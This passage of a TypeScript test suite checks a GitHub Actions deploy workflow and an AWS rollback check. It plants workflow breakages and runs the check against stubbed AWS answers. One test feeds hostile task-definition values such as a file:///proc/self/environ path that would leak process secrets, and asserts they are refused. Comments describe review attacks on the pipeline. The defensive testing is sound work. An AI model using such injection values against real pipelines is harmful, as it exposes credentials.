      expect(found(plant(release, to, job('synth'))), to).toEqual([at(RELEASE)])
    }
    expect(
      found(
        plant(
          `          ref: \${{ needs.gate.outputs.previous_prod_commit }}\n`,
          `          ref: \${{ needs.gate.outputs.previous_nonprod_commit }}\n`,
          job('synth-previous-prod'),
        ),
      ),
    ).toEqual([at("synth-previous-prod (Check out prod's previous release)")])
    // The release's and nonprod's previous folders swapped: each synth step then runs in the other's tree.
    const swapped = edited(
      edited(deployText, '          path: release\n', '          path: previous-nonprod\n', job('synth')),
      '          path: previous-nonprod\n',
      '          path: release\n',
      "      - name: Check out nonprod's previous release\n",
    )
    expect(found(withText(DEPLOY, swapped))).toEqual([
      at(RELEASE),
      at("synth-previous-nonprod (Check out nonprod's previous release)"),
    ])
  })

  // The seventh review's first attack: the release's synth once ran on the runner that then checked out,
  // installed and synthesised each previous release, so a process its code left behind rewrote prod's
  // previous release's source before that synth read it, and the automatic rollback deployed what no commit
  // holds. Each previous release has a job of its own now, and no job checks out twice.
  it('checks out one commit at most in each job, so no runner making an assembly runs a second commit', () => {
    const ONE =
      "checks out one commit at most, so no runner that synthesises an assembly, or reads one, runs a second commit's code"
    const one = (texts: ReadonlyMap<string, string>) =>
      credentialedCodeFindings(texts, manifests, lockfile).filter(each => each.endsWith(ONE))
    expect(one(workflows)).toEqual([])
    const previous = stepText(deployText, 'synth-previous-prod', "Check out prod's previous release")
    const twice = edited(
      deployText,
      '      - name: Install the release\n',
      `${previous}      - name: Install the release\n`,
      job('synth'),
    )
    expect(one(withText(DEPLOY, twice))).toEqual([`${DEPLOY}: DPW-10 synth: ${ONE}`])
    const again = stepText(deployText, 'nonprod', "Check out the run's commit")
    const deploying = edited(
      deployText,
      '      - name: The release this job deploys\n',
      `${again}      - name: The release this job deploys\n`,
      job('nonprod'),
    )
    expect(one(withText(DEPLOY, deploying))).toEqual([`${DEPLOY}: DPW-10 nonprod: ${ONE}`])
  })

  it('holds every download, upload, Node and credentials input to its value', () => {
    expect(
      found(
        plant(
          `          path: \${{ runner.temp }}/image\n`,
          `          path: \${{ runner.temp }}/assembly\n`,
          job('nonprod'),
        ),
      ),
    ).toEqual([at('nonprod (Download the image)')])
    expect(
      found(
        plant(
          `          artifact-ids: \${{ needs.synth.outputs.assembly }}\n`,
          `          artifact-ids: \${{ needs.synth-previous-prod.outputs.assembly }}\n`,
          job('prod'),
        ),
      ),
    ).toEqual([at('prod (Download the assembly)')])
    expect(found(plant('          name: assembly\n', '          name: assembly-x\n', job('synth')))).toEqual([
      at("synth (Upload the release's assembly)"),
    ])
    expect(found(plant('          retention-days: 14\n', '          retention-days: 90\n', job('build')))).toEqual([
      at('build (Upload the image)'),
    ])
    expect(
      found(
        plant('          node-version-file: repo/.nvmrc\n', '          node-version-file: other/.nvmrc\n', job('gate')),
      ),
    ).toEqual([at('gate (Node, from .nvmrc)')])
    expect(
      found(
        plant('          role-duration-seconds: 3600\n', '          role-duration-seconds: 43200\n', job('nonprod')),
      ),
    ).toEqual([at('nonprod (AWS credentials)')])
  })

  it('holds the repository', () => {
    expect(found(workflows)).toEqual([])
  })
})

describe('DPW-14 (C11-D76): the asset and release checks', () => {
  const at = (where: string, rule: string) => `${DEPLOY}: DPW-14 ${where}: ${rule}`
  const UPLOADED =
    "runs ASSET_CHECK on each assembly it uploads, before the upload, in a step that checks the folder its ASSEMBLY_FOLDER names (one of ASSEMBLY_FOLDERS, the upload's) against the release its RELEASE names (the one its job synthesised)"
  const CHECKED =
    "runs ASSET_CHECK on each folder it downloaded, in a step of its own that checks the folder its ASSEMBLY_FOLDER names (one of ASSEMBLY_FOLDERS, the download's) against the release its RELEASE names (the one that folder holds), after its download, under its download's if: or none, and before the credentials action"

  it('finds each planted breakage in the workflow', () => {
    // GUARDS-02: null == 0 is true on GitHub, so this download would run with empty artifact-ids; round 2's
    // GUARDS-03: so is an operand whose value isn't known compared with a boolean, and 'K' != 'k'.
    const download = `        if: \${{ needs.synth.outputs.assembly != '' }}\n`
    for (const term of ['null == 0', "(github.run_id || 'a') != true", "'\u212A' != 'k'"]) {
      expect(
        assetCheckFindings(plant(download, download.replace(" != '' }}", ` != '' || ${term} }}`), job('nonprod'))),
        term,
      ).toEqual([
        at(
          'nonprod (Download the assembly)',
          'downloads only with an if: that requires its artifact-ids to be non-empty',
        ),
      ])
    }
    expect(assetCheckFindings(movedStep('nonprod', 'Check the assembly', 'What runs'))).toEqual([
      at('nonprod', CHECKED),
    ])
    expect(assetCheckFindings(removedStep('rollback-prod', 'Check the previous assembly'))).toEqual([
      at('rollback-prod', CHECKED),
    ])
    expect(
      assetCheckFindings(plant("asset_refuse 'the assembly holds a symbolic link'", 'true', job('nonprod'))),
    ).toEqual([at('nonprod', CHECKED), at('nonprod (Check the assembly)', STANDS_ALONE)])
    expect(
      assetCheckFindings(plant('check_release_in "$RUNNER_TEMP/$ASSEMBLY_FOLDER" "$RELEASE"', 'true', job('prod'))),
    ).toEqual([at('prod', CHECKED), at('prod (Check the assembly)', STANDS_ALONE)])
    expect(
      assetCheckFindings(plant(`        if: \${{ needs.synth.outputs.assembly != '' }}\n`, '', job('nonprod'))),
    ).toEqual([
      at(
        'nonprod (Download the assembly)',
        'downloads only with an if: that requires its artifact-ids to be non-empty',
      ),
    ])
    expect(
      assetCheckFindings(
        plant(
          `        if: \${{ needs.synth.outputs.assembly != '' }}\n`,
          `        if: \${{ needs.synth.outputs.assembly != '' || always() }}\n`,
          job('nonprod'),
        ),
      ),
    ).toEqual([
      at(
        'nonprod (Download the assembly)',
        'downloads only with an if: that requires its artifact-ids to be non-empty',
      ),
    ])
    expect(
      assetCheckFindings(
        plant(
          `          ${CDK_FOLDER}\n`,
          '          mkdir -p /tmp/cdk && cd /tmp/cdk && HOME="$(mktemp -d)" && export HOME\n',
          job('nonprod'),
        ),
      ),
    ).toEqual([at('nonprod (Deploy Platform, Data and Tasks)', 'starts the CLI in CDK_FOLDER’s fresh folder')])
    expect(assetCheckFindings(removedStep('synth', "Check the release's assembly"))).toEqual([
      at("synth (Upload the release's assembly)", UPLOADED),
    ])
  })

  // Round 13: the nine steps that check an assembly run one text, ASSET_CHECK_RUN, whose two calls read the folder
  // from the step's ASSEMBLY_FOLDER and the release from its RELEASE, so those two env: entries say what each step
  // checks: DPW-14 holds the folder to ASSEMBLY_FOLDERS and the one its download or upload names, and the release
  // to the one that folder holds, and STEP_ENVS pins both (DPW-10's env: finding).
  it("checks the folder each step's ASSEMBLY_FOLDER names against the release its RELEASE names (round 13)", () => {
    const ENV =
      'sets only the environment variables the workflow uses, each to the value STEP_ENVS names (a job, STAGE alone): no BASH_ENV, PATH or NODE_OPTIONS, and no input from another step, job or context'
    const pinnedEnv = (where: string) => `${DEPLOY}: DPW-10 ${where}: ${ENV}`
    const inStep = (text: string, id: string, name: string, from: string, to: string) => {
      const step = stepText(text, id, name)
      return edited(text, step, edited(step, from, to), job(id))
    }
    const changed = (id: string, name: string, from: string, to: string) =>
      withText(DEPLOY, inStep(deployText, id, name, from, to))
    const credentialed = (planted: Texts) => credentialedCodeFindings(planted, manifests, lockfile)
    // Every check runs the one text, its folder and release in its env:.
    const previousOf = (stage: string) =>
      `\${{ needs.gate.outputs.previous_${stage}_commit }}:\${{ needs.gate.outputs.previous_${stage}_digest }}`
    const checks = workflowJobs(deployText).flatMap(each =>
      parsedSteps(each)
        .filter(step => step.run === ASSET_CHECK_RUN)
        .map(step => [each.id, step.name, step.env.get('ASSEMBLY_FOLDER'), step.env.get('RELEASE')]),
    )
    expect(checks).toEqual([
      ['synth', "Check the release's assembly", 'assembly', `\${{ steps.synth.outputs.release }}`],
      [
        'synth-previous-nonprod',
        "Check nonprod's previous assembly",
        'assembly-previous-nonprod',
        previousOf('nonprod'),
      ],
      ['synth-previous-prod', "Check prod's previous assembly", 'assembly-previous-prod', previousOf('prod')],
      ['nonprod', 'Check the assembly', 'assembly', `\${{ steps.release.outputs.release }}`],
      [
        'rollback-nonprod',
        'Check the previous assembly',
        'assembly-previous',
        `\${{ steps.release.outputs.previous }}`,
      ],
      ['prod-plan', 'Check the assembly', 'assembly', `\${{ steps.release.outputs.release }}`],
      ['prod-plan', 'Check the previous assembly', 'assembly-previous', previousOf('prod')],
      ['prod', 'Check the assembly', 'assembly', `\${{ steps.release.outputs.release }}`],
      ['rollback-prod', 'Check the previous assembly', 'assembly-previous', `\${{ steps.release.outputs.previous }}`],
    ])
    expect(new Set(checks.map(([, , folder]) => folder))).toEqual(new Set(ASSEMBLY_FOLDERS))
    // nonprod's check pointed at another of the four folders: the one it downloaded goes unchecked.
    const another = changed(
      'nonprod',
      'Check the assembly',
      '          ASSEMBLY_FOLDER: assembly\n',
      '          ASSEMBLY_FOLDER: assembly-previous\n',
    )
    expect(assetCheckFindings(another)).toEqual([at('nonprod', CHECKED)])
    expect(credentialed(another)).toContain(pinnedEnv('nonprod (Check the assembly)'))
    // A folder outside ASSEMBLY_FOLDERS, with nonprod's download moved there too, which the list alone refuses.
    const elsewhere = inStep(
      deployText,
      'nonprod',
      'Download the assembly',
      `          path: \${{ runner.temp }}/assembly\n`,
      `          path: \${{ runner.temp }}/assembly-elsewhere\n`,
    )
    const outside = withText(
      DEPLOY,
      inStep(
        elsewhere,
        'nonprod',
        'Check the assembly',
        '          ASSEMBLY_FOLDER: assembly\n',
        '          ASSEMBLY_FOLDER: assembly-elsewhere\n',
      ),
    )
    expect(assetCheckFindings(outside)).toEqual([at('nonprod', CHECKED)])
    expect(credentialed(outside)).toContain(pinnedEnv('nonprod (Check the assembly)'))
    // A rollback's check given this run's release, where its folder holds the previous one.
    const release = changed(
      'rollback-nonprod',
      'Check the previous assembly',
      `          RELEASE: \${{ steps.release.outputs.previous }}\n`,
      `          RELEASE: \${{ steps.release.outputs.release }}\n`,
    )
    expect(assetCheckFindings(release)).toEqual([at('rollback-nonprod', CHECKED)])
    expect(credentialed(release)).toContain(pinnedEnv('rollback-nonprod (Check the previous assembly)'))
    // synth's check with no ASSEMBLY_FOLDER (set -u would stop it at its first call): its upload goes unchecked.
    const dropped = changed('synth', "Check the release's assembly", '          ASSEMBLY_FOLDER: assembly\n', '')
    expect(assetCheckFindings(dropped)).toEqual([at("synth (Upload the release's assembly)", UPLOADED)])
    expect(credentialed(dropped)).toContain(pinnedEnv("synth (Check the release's assembly)"))
    // synth-previous-prod's check given nonprod's previous release.
    const swapped = changed(
      'synth-previous-prod',
      "Check prod's previous assembly",
      `          RELEASE: ${previousOf('prod')}\n`,
      `          RELEASE: ${previousOf('nonprod')}\n`,
    )
    expect(assetCheckFindings(swapped)).toEqual([at("synth-previous-prod (Upload prod's previous assembly)", UPLOADED)])
    expect(credentialed(swapped)).toContain(pinnedEnv("synth-previous-prod (Check prod's previous assembly)"))
    // prod-plan's check under its previous assembly's if: pointed at the release's folder, whose download runs
    // unconditionally: a check skipped where its download runs (DPW-06).
    const skipped = changed(
      'prod-plan',
      'Check the previous assembly',
      '          ASSEMBLY_FOLDER: assembly-previous\n',
      '          ASSEMBLY_FOLDER: assembly\n',
    )
    expect(deployStepFindings(skipped)).toContain(
      `${DEPLOY}: DPW-06 prod-plan: runs every step up to its credentials action, and AWS_CHECK after it, unconditionally, but its downloads, a download’s asset check under that download’s if:, and its image check, under the push’s if:`,
    )
  }, 60_000)

  it('holds the repository', () => {
    expect(assetCheckFindings(workflows)).toEqual([])
  })
})

// AWS_CHECK itself (DPW-06), run with bash and jq as the deploy jobs run it, after the preamble: aws is a
// shell function answering from planted JSON by its arguments, and git is real, in a scratch
// repository whose main holds A, B and C (the run's commit) and a branch commit X off A.
describe('DPW-06 (C11-D52, C11-D58, C11-D61): AWS_CHECK against planted AWS answers', () => {
  let repo = ''
  let scratch = ''
  const c: Record<'A' | 'B' | 'C' | 'X' | 'L', string> = { A: '', B: '', C: '', X: '', L: '' }
  const email = ['test', 'example.invalid'].join('@')
  const git = (args: readonly string[]) =>
    execFileSync(
      'git',
      [
        ...['-c', 'user.name=hearth-test', '-c', `user.email=${email}`, '-c', 'commit.gpgsign=false'],
        ...['-c', 'tag.gpgSign=false', '-c', 'core.hooksPath=/dev/null', ...args],
      ],
      {
        cwd: repo,
        encoding: 'utf8',
        stdio: ['ignore', 'pipe', 'pipe'],
      },
    ).trim()
  beforeAll(() => {
    repo = mkdtempSync(join(tmpdir(), 'hearth-dpw06-'))
    scratch = mkdtempSync(join(tmpdir(), 'hearth-dpw06-out-'))
    git(['init', '-q', '-b', 'main'])
    for (const name of ['A', 'B', 'C'] as const) {
      writeFileSync(join(repo, 'f'), name)
      git(['add', 'f'])
      git(['commit', '-q', '-m', name])
      c[name] = git(['rev-parse', 'HEAD'])
    }
    git(['checkout', '-q', '-b', 'side', c.A])
    git(['commit', '-q', '--allow-empty', '-m', 'X'])
    c.X = git(['rev-parse', 'HEAD'])
    // L, a later commit than the run's (C), whose run pushed an image after this run's gate read the floors.
    git(['checkout', '-q', '-b', 'later', c.C])
    git(['commit', '-q', '--allow-empty', '-m', 'L'])
    c.L = git(['rev-parse', 'HEAD'])
    git(['checkout', '-q', 'main'])
  })
  afterAll(() => {
    for (const folder of [repo, scratch]) if (folder !== '') rmSync(folder, { recursive: true, force: true })
  })

  const digest = (n: number) => `sha256:${String(n).padStart(64, '0')}`
  const D = { A: digest(1), B: digest(2), C: digest(3), D: digest(4) }
  const release = (commit: 'A' | 'B' | 'C' | 'X' | 'L', d: string) => `${c[commit]}:${d}`
  const stack = (status: string, value: string | null) => JSON.stringify([status, value])
  // A service's task definition as ECS names it, its stage's own family's (the account built from parts, so no id
  // is written here).
  const td = (kind: string, revision = 1, stage = 'nonprod') =>
    `${['arn', 'aws', 'ecs', 'ap-southeast-1', '0'.repeat(12)].join(':')}:task-definition/hearth-${stage}-${kind}:${revision}`
  const ONE = JSON.stringify({ services: [td('api'), td('realtime'), td('worker')], counts: [1, 1, 1] })
  const TWO = JSON.stringify({ services: [td('api'), td('api', 2), td('realtime'), td('worker')], counts: [2, 1, 1] })
  const MISSING = JSON.stringify({ services: [], counts: [] })
  const tags = (pairs: ReadonlyArray<readonly [string, 'A' | 'B' | 'C' | 'X']>) =>
    JSON.stringify(Object.fromEntries(pairs.map(([d, commit]) => [d, [`sha-${c[commit]}-11-1`]])))

  interface Answers {
    mode: 'deploy' | 'rollback' | 'drill' | 'restore' | 'auto'
    stage?: string
    release: string
    previous?: string
    // auto: what the deploy job's own check found running (REPLACED), the previous release unless named.
    replaced?: string
    first?: boolean
    stack: string
    services: string
    running: string
    drift?: string
    ecr?: string
    // The commits of ECR's images, by their tags (A, B and C unless named), or ECR's raw answer.
    pushed?: ReadonlyArray<'A' | 'B' | 'C' | 'X' | 'L'> | { raw: string }
    restore?: string
  }
  // The stand-in aws: a stack named Hearth-restore-* never exists, so a restore reads prod's alone.
  const STUB = `aws() {
  case "$1 $2" in
    'cloudformation describe-stacks')
      if [ "$STACK" = none ] || [[ "$4" == Hearth-restore-* ]]; then
        echo "An error occurred (ValidationError) when calling the DescribeStacks operation: Stack with id $4 does not exist" >&2
        return 254
      fi
      printf '%s\\n' "$STACK" ;;
    'ecs describe-services')
      if [ "$SERVICES" = nocluster ]; then
        echo 'An error occurred (ClusterNotFoundException) when calling the DescribeServices operation: Cluster not found.' >&2
        return 254
      fi
      printf '%s\\n' "$SERVICES" ;;
    'ecs describe-task-definition')
      if [[ "$4" == *-worker:* ]] && [ -n "$DRIFT" ]; then echo "registry.invalid/hearth-server@$DRIFT"; else echo "registry.invalid/hearth-server@$RUNNING"; fi ;;
    'ecr describe-images')
      if [ "$5" = --query ]; then printf '%s\\n' "$PUSHED"; return; fi
      jq -e --arg d "\${6#imageDigest=}" '.[$d]' <<<"$ECR" || { echo 'An error occurred (ImageNotFoundException)' >&2; return 254; } ;;
    *) echo "unexpected aws $*" >&2; return 99 ;;
  esac
}`

  function awsCheck(a: Answers): { verdict: 'pass' | 'refused' | 'rolled-false'; said: string } {
    const output = join(scratch, 'output')
    writeFileSync(output, '')
    const result = spawnSync('bash', ['-c', `${STUB}\n${PREAMBLE}\n${AWS_CHECK}\naws_check "$1"`, '_', a.mode], {
      cwd: repo,
      encoding: 'utf8',
      env: {
        PATH: process.env.PATH ?? '',
        HOME: scratch,
        GITHUB_WORKSPACE: scratch,
        RUNNER_TEMP: scratch,
        GITHUB_SHA: c.C,
        GITHUB_OUTPUT: output,
        GITHUB_STEP_SUMMARY: join(scratch, 'summary'),
        STAGE: a.stage ?? 'nonprod',
        RELEASE: a.release,
        PREVIOUS: a.previous ?? '',
        REPLACED: a.replaced ?? a.previous ?? '',
        FIRST: String(a.first ?? false),
        STACK: a.stack,
        SERVICES: a.services,
        RUNNING: a.running,
        DRIFT: a.drift ?? '',
        ECR: a.ecr ?? '{}',
        PUSHED:
          a.pushed !== undefined && 'raw' in a.pushed
            ? a.pushed.raw
            : JSON.stringify([...(a.pushed ?? ['A', 'B', 'C']).map(commit => `sha-${c[commit]}-12-1`), 'other']),
        ...(a.restore === undefined ? {} : { RESTORE: a.restore }),
      },
    })
    // A refusal is aws_check's one line on stdout (the stand-in's own errors go to stderr).
    const said = result.stdout.trim().split('\n').at(-1) ?? ''
    if (result.status !== 0) return { verdict: 'refused', said }
    return { verdict: readFileSync(output, 'utf8').includes('go=false') ? 'rolled-false' : 'pass', said }
  }
  // Built when a case runs, once beforeAll has made the commits: B's release runs, and ECR holds A, B
  // and C, each under its own commit's tag.
  const runsB = () => ({ stack: stack('UPDATE_COMPLETE', release('B', D.B)), services: ONE, running: D.B })
  const all = () =>
    tags([
      [D.A, 'A'],
      [D.B, 'B'],
      [D.C, 'C'],
    ])

  it('passes each mode with no drift', () => {
    expect(awsCheck({ mode: 'deploy', release: release('C', D.C), ...runsB() }).verdict).toBe('pass')
    expect(awsCheck({ mode: 'rollback', release: release('A', D.A), ...runsB(), ecr: all() }).verdict).toBe('pass')
    expect(awsCheck({ mode: 'drill', release: release('B', D.B), ...runsB(), ecr: all() }).verdict).toBe('pass')
    const live = { stack: stack('UPDATE_COMPLETE', release('C', D.C)), services: ONE, running: D.C }
    expect(
      awsCheck({ mode: 'auto', release: release('C', D.C), previous: release('B', D.B), ...live, ecr: all() }).verdict,
    ).toBe('pass')
    expect(
      awsCheck({
        mode: 'restore',
        stage: 'restore',
        release: release('B', D.B),
        ...runsB(),
        services: 'nocluster',
        ecr: all(),
      }).verdict,
    ).toBe('pass')
  })

  it('refuses a deploy or a drill over drift, naming the rollback, and lets a rollback go only to what all three run', () => {
    const drifted = { ...runsB(), running: D.A }
    const deploy = awsCheck({ mode: 'deploy', release: release('C', D.C), ...drifted, ecr: all() })
    expect(deploy.verdict).toBe('refused')
    // The refusal is shown through the account-id filter, which leaves a commit whole.
    expect(deploy.said).toContain(`dispatch mode=rollback with release ${c.A} first (deploy-and-rollback.md)`)
    // One service drifted: a deploy and a drill are refused alike. No single release is what all three run,
    // so the line's reason is pinned and not the release it names.
    const reason = "aws-check: the services don't run Release's image (an incident rollback outside the pipeline)"
    for (const oneDrifted of [
      awsCheck({ mode: 'deploy', release: release('C', D.C), ...runsB(), drift: D.A, ecr: all() }),
      awsCheck({ mode: 'drill', release: release('B', D.B), ...runsB(), drift: D.A, ecr: all() }),
    ]) {
      expect(oneDrifted.verdict).toBe('refused')
      expect(oneDrifted.said).toContain(reason)
    }
    const drill = awsCheck({ mode: 'drill', release: release('B', D.B), ...drifted, ecr: all() })
    expect(drill.verdict).toBe('refused')
    expect(drill.said).toContain(`dispatch mode=rollback with release ${c.A} first (deploy-and-rollback.md)`)
    expect(awsCheck({ mode: 'rollback', release: release('A', D.A), ...drifted, ecr: all() }).verdict).toBe('pass')
    const elsewhere = { stack: stack('UPDATE_COMPLETE', release('C', D.C)), services: ONE, running: D.B }
    expect(awsCheck({ mode: 'rollback', release: release('A', D.A), ...elsewhere, ecr: all() }).verdict).toBe('refused')
    expect(awsCheck({ mode: 'rollback', release: release('A', D.A), ...runsB(), drift: D.A, ecr: all() }).verdict).toBe(
      'refused',
    )
  }, 30_000)

  // The tenth review's first attack (FLOW-A1-01): a service's task definition reached aws as a value no text held
  // to its shape, so a refactor that read it from the Services stack's outputs, which a release writes, handed
  // aws-cli a file:// value to load and send to ECS. Each is now one of its stage's own families' before ECS is
  // asked for its image; the stand-in answers describe-task-definition for any name, so each refusal is the check's.
  it("refuses a service's task definition of another shape before asking ECS for its image (FLOW-A1-01)", () => {
    const TD = "aws-check: a service's task definition isn't one of its stage's"
    for (const other of [
      'file:///proc/self/environ',
      `file:///proc/self/environ:task-definition/hearth-nonprod-worker:1`,
      td('worker', 1, 'prod'),
      td('bastion'),
      td('migrate'),
      td('worker', 0),
      td('worker', 1234567),
      `${td('worker')}x`,
      `x${td('worker')}`,
      td('worker').replace('ap-southeast-1', 'us-east-1'),
      td('worker').replace('0'.repeat(12), '0'.repeat(11)),
      'hearth-nonprod-worker:1',
    ]) {
      const services = JSON.stringify({ services: [td('api'), td('realtime'), other], counts: [1, 1, 1] })
      expect(awsCheck({ mode: 'deploy', release: release('C', D.C), ...runsB(), services }), other).toEqual({
        verdict: 'refused',
        said: TD,
      })
    }
    // The stage's own families, at any revision, pass.
    const later = JSON.stringify({
      services: [td('api', 7), td('realtime', 12), td('worker', 999999)],
      counts: [1, 1, 1],
    })
    expect(awsCheck({ mode: 'deploy', release: release('C', D.C), ...runsB(), services: later }).verdict).toBe('pass')
  })

  it('refuses while a deployment is in progress', () => {
    const two = awsCheck({ mode: 'deploy', release: release('C', D.C), ...runsB(), services: TWO })
    expect(two).toEqual({
      verdict: 'refused',
      said: 'aws-check: a deployment is in progress: wait for it to settle, then dispatch again',
    })
    const moving = awsCheck({
      mode: 'deploy',
      release: release('C', D.C),
      ...runsB(),
      stack: stack('UPDATE_IN_PROGRESS', release('B', D.B)),
    })
    expect(moving).toEqual(two)
    // CloudFormation's longest status, 44 characters, is a deployment in progress too, in every mode.
    const cleanup = stack('UPDATE_ROLLBACK_COMPLETE_CLEANUP_IN_PROGRESS', release('B', D.B))
    expect(awsCheck({ mode: 'deploy', release: release('C', D.C), ...runsB(), stack: cleanup })).toEqual(two)
    expect(
      awsCheck({
        mode: 'auto',
        release: release('C', D.C),
        previous: release('B', D.B),
        ...runsB(),
        stack: cleanup,
        ecr: all(),
      }),
    ).toEqual(two)
  })

  it('finds no release only on a first deploy, with no stack or a failed first create and no services', () => {
    const none = { stack: 'none', services: 'nocluster', running: D.B }
    const failed = { stack: stack('ROLLBACK_COMPLETE', null), services: MISSING, running: D.B }
    expect(awsCheck({ mode: 'deploy', release: release('C', D.C), first: true, ...none }).verdict).toBe('pass')
    expect(awsCheck({ mode: 'deploy', release: release('C', D.C), first: false, ...none }).verdict).toBe('refused')
    expect(awsCheck({ mode: 'deploy', release: release('C', D.C), first: true, ...failed }).verdict).toBe('pass')
    expect(awsCheck({ mode: 'deploy', release: release('C', D.C), first: false, ...failed }).verdict).toBe('refused')
    expect(
      awsCheck({ mode: 'deploy', release: release('C', D.C), first: true, ...failed, services: ONE }).verdict,
    ).toBe('refused')
    expect(awsCheck({ mode: 'rollback', release: release('A', D.A), first: true, ...none, ecr: all() }).verdict).toBe(
      'refused',
    )
    // Round 2's ROLLBACK-03: a failed create whose rollback failed waits for tier 2, Release or none.
    for (const value of [null, release('B', D.B)]) {
      expect(
        awsCheck({
          mode: 'deploy',
          release: release('C', D.C),
          first: true,
          ...failed,
          stack: stack('ROLLBACK_FAILED', value),
        }).said,
        String(value),
      ).toBe(
        'aws-check: the Services stack is ROLLBACK_FAILED (a failed create whose rollback failed), which waits for tier 2 (deploy-and-rollback.md)',
      )
    }
    // Round 3's AWS-01: an update whose rollback failed is no settled stack. The CLI can't continue it, so
    // every mode refuses before anything moves, a restore (which reads prod's Services stack) included.
    const stuck = stack('UPDATE_ROLLBACK_FAILED', release('B', D.B))
    const refusal =
      'aws-check: the Services stack is UPDATE_ROLLBACK_FAILED (an update whose rollback failed), which waits for tier 2 (deploy-and-rollback.md)'
    expect(awsCheck({ mode: 'deploy', release: release('C', D.C), ...runsB(), stack: stuck }).said).toBe(refusal)
    expect(awsCheck({ mode: 'rollback', release: release('A', D.A), ...runsB(), stack: stuck, ecr: all() }).said).toBe(
      refusal,
    )
    expect(awsCheck({ mode: 'drill', release: release('B', D.B), ...runsB(), stack: stuck, ecr: all() }).said).toBe(
      refusal,
    )
    const live = { stack: stack('UPDATE_ROLLBACK_FAILED', release('C', D.C)), services: ONE, running: D.C }
    expect(
      awsCheck({ mode: 'auto', release: release('C', D.C), previous: release('B', D.B), ...live, ecr: all() }).said,
    ).toBe(refusal)
    for (const restore of ['up', 'down']) {
      expect(
        awsCheck({
          mode: 'restore',
          stage: 'restore',
          restore,
          release: release('B', D.B),
          stack: stuck,
          services: 'nocluster',
          running: D.B,
          ecr: all(),
        }).said,
        restore,
      ).toBe(refusal)
    }
  }, 30_000)

  it('refuses a rollback to what runs or to what isn’t strictly older, and a release off main', () => {
    expect(awsCheck({ mode: 'rollback', release: release('A', D.B), ...runsB(), ecr: all() }).said).toBe(
      'aws-check: the target is the release running now',
    )
    expect(awsCheck({ mode: 'rollback', release: release('C', D.C), ...runsB(), ecr: all() }).said).toBe(
      'aws-check: the target is not strictly older than the release running now',
    )
    expect(awsCheck({ mode: 'rollback', release: release('B', D.A), ...runsB(), ecr: all() }).verdict).toBe('refused')
    const offMain = { ...runsB(), stack: stack('UPDATE_COMPLETE', release('X', D.B)) }
    expect(awsCheck({ mode: 'deploy', release: release('C', D.C), ...offMain }).said).toBe(
      "aws-check: what runs is not on main at this run's commit",
    )
    expect(
      awsCheck({ mode: 'deploy', release: release('C', D.C), ...runsB(), stack: stack('UPDATE_COMPLETE', 'nope') })
        .said,
    ).toBe("aws-check: the Services stack's Release output is malformed")
  })

  it('rolls nothing back once another run has deployed since', () => {
    const since = { stack: stack('UPDATE_COMPLETE', release('A', D.A)), services: ONE, running: D.A }
    const auto = awsCheck({
      mode: 'auto',
      release: release('C', D.C),
      previous: release('B', D.B),
      ...since,
      ecr: all(),
    })
    expect(auto.verdict).toBe('rolled-false')
    expect(readFileSync(join(scratch, 'output'), 'utf8')).toBe('go=false\nrolled=false\n')
  })

  // ROLLBACK-02: the gate's previous release is the newest record when it read them; a rollback that landed
  // since, or a failed one, can leave an older release live, which the deploy then replaced. Going back to
  // the previous release would then move forward past it, so auto goes on only when the release the deploy
  // replaced is the previous one or a later one (or none, on a first deploy).
  it('rolls nothing back when the deploy replaced a release older than the previous one', () => {
    const live = { stack: stack('UPDATE_COMPLETE', release('C', D.C)), services: ONE, running: D.C }
    const auto = (replaced: string) =>
      awsCheck({ mode: 'auto', release: release('C', D.C), previous: release('B', D.B), replaced, ...live, ecr: all() })
    // Replaced older than the previous release (a rollback landed in between), off main, empty or malformed.
    for (const replaced of [release('A', D.A), release('X', D.A), '', 'nope']) {
      const stopped = auto(replaced)
      expect(stopped.verdict, replaced).toBe('rolled-false')
      expect(stopped.said, replaced).toContain(
        `not the previous release (${release('B', D.B)}) or a later one (a rollback, or a failed one, left an older release live after the gate read the records), so nothing is rolled back: dispatch mode=rollback (deploy-and-rollback.md)`,
      )
      expect(readFileSync(join(scratch, 'output'), 'utf8')).toBe('go=false\nrolled=false\n')
    }
    expect(auto(release('A', D.A)).said).toContain(`this run's deploy replaced ${release('A', D.A)}, not`)
    expect(auto('').said).toContain("this run's deploy replaced a release it never named, not")
    // The previous release itself, an earlier build of its commit, a later release (a re-run's own), or none.
    for (const replaced of [release('B', D.B), release('B', D.D), release('C', D.C), 'none']) {
      expect(auto(replaced).verdict, replaced).toBe('pass')
    }
  }, 30_000)

  it('outputs what a deploy or a drill replaced, for the rollback job', () => {
    const outputs = () => readFileSync(join(scratch, 'output'), 'utf8')
    expect(awsCheck({ mode: 'deploy', release: release('C', D.C), ...runsB() }).verdict).toBe('pass')
    expect(outputs()).toBe(`go=true\nreplaced=${release('B', D.B)}\n`)
    const none = { stack: 'none', services: 'nocluster', running: D.B }
    expect(awsCheck({ mode: 'deploy', release: release('C', D.C), first: true, ...none }).verdict).toBe('pass')
    expect(outputs()).toBe('go=true\nreplaced=none\n')
    expect(awsCheck({ mode: 'drill', release: release('B', D.B), ...runsB(), ecr: all() }).verdict).toBe('pass')
    expect(outputs()).toBe(`go=true\nreplaced=${release('B', D.B)}\n`)
    expect(awsCheck({ mode: 'rollback', release: release('A', D.A), ...runsB(), ecr: all() }).verdict).toBe('pass')
    expect(outputs()).toBe('go=true\n')
  })

  // ROLLBACK-01: a later run can push, migrate past a floor the gate never read, then fail with Release
  // unchanged; a rollback then goes back only while every image in ECR is of this run's commit or older.
  it('rolls nothing back, and refuses a rollback, once a later commit than the run’s has pushed an image', () => {
    const live = { stack: stack('UPDATE_COMPLETE', release('C', D.C)), services: ONE, running: D.C }
    const auto = (pushed: Answers['pushed']) =>
      awsCheck({ mode: 'auto', release: release('C', D.C), previous: release('B', D.B), ...live, ecr: all(), pushed })
    for (const later of ['L', 'X'] as const) {
      const stopped = auto(['A', later, 'B', 'C'])
      expect(stopped.verdict).toBe('rolled-false')
      expect(stopped.said).toContain(`aws-check: auto: a later commit (${c[later]}) pushed an image`)
      expect(readFileSync(join(scratch, 'output'), 'utf8')).toBe('go=false\nrolled=false\n')
    }
    expect(auto(['A', 'B', 'C']).verdict).toBe('pass')
    expect(auto(['B']).verdict).toBe('pass')
    const rollback = (pushed: Answers['pushed']) =>
      awsCheck({ mode: 'rollback', release: release('A', D.A), ...runsB(), ecr: all(), pushed })
    expect(rollback(['A', 'B', 'C', 'L']).said).toBe(
      `aws-check: a later commit (${c.L}) pushed an image, so it may have migrated the database: check the floors at it (deploy-and-rollback.md)`,
    )
